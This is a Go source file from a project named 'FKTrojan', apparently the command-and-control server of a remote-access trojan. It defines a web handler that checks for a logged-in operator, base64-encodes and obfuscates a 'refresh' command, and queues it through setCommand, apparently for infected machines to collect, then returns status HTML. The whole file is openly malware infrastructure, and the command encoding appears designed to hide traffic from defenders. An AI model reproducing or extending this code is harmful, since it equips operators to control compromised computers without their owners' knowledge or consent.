/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"fmt"
	"net/http"
	"strings"
)

//------------------------------------------------------------
func RefreshHandler(response http.ResponseWriter, request *http.Request) {
	userName := GetUserName(request)
	if userName != "" {
		tmpstring := "000|refresh|"
		done := setCommand(common.Obfuscate(common.Base64Encode(tmpstring)))
		if done {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
			result := r.Replace(SuccessHTML)
			fmt.Fprintf(response, result)
		} else {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
			result := r.Replace(ErrorHTML)
			fmt.Fprintf(response, result)
		}
	} else {
		fmt.Fprintf(response, LoginHTML)
	}
}

//------------------------------------------------------------
